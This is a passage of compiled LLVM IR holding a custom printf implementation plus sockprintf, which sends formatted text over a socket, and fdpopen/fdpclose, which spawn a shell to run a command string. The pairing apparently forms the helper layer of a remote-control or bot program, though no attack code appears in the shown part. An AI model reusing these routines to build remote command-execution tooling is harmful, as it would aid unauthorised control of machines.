  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
